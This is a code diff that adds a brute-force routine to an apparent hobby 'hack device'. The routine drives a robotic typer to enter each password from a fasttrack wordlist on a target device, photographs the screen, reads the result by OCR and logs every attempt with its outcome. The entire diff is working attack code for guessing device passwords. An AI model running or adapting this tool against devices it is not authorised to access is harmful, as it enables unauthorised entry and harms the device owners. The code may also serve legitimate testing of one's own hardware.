@@ -12,7 +12,34 @@ class Hack_device(Robo_typer, Picamera2):
         self.wrdlst = open("wordlists/fasttrack.txt", "r")  # wordlist location
 
     def bruteforce(self):
-        print("yolo")
+        '''this method is the bruteforcing algorithm'''
+        self.robo_typer.initialize_I2Cs()  # initalize I2C
+        self.picam2.start_preview(Preview.QTGL)  # open a preview window
+        self.picam2.start()  # start camera for further processing
+        f = open("results.txt", "w")  # open results file in write mode
+        f.write("")  # write nothing in the file / delete content
+        f.close()  # close file
+        for line in self.wrdlst:  # try every line entry in the wordlist
+            print("\nI am typing:", line.strip('\n'))  # info for operator
+            '''the following let`s the hack device type the line entry of the
+            wordlist. In other words: The hacking device is typing one
+            password'''
+            self.robo_typer.type_string(line.strip('\n') + "   ")
+            self.robo_typer.switch_module_outlet(3, 8)  # hit the enter key
+            time.sleep(0.5)  # wait for typing to take place
+            print("Taking photo")  # info for operator
+            self.picam2.capture_file("images/image01.jpg")  # take picture
+            print("transferring photo to text")  # info for operator
+            '''the following converts the image to text via AI'''
+            result = self.reader.readtext('images/image01.jpg', detail=0)
+            result_str = " ".join(result)  # merge the result list to a string
+            print("This is what I read", result)  # info for operator
+            f = open("results.txt", "a")  # open file for appending
+            '''the following concenacts what was typed and the result text,
+            which was AI converted from the camera to the result text file'''
+            new_line = line.strip('\n') + " - " + result_str + "\n"
+            f.write(new_line)  # append the new line
+            f.close()  # close file
 
 
 if __name__ == "__main__":
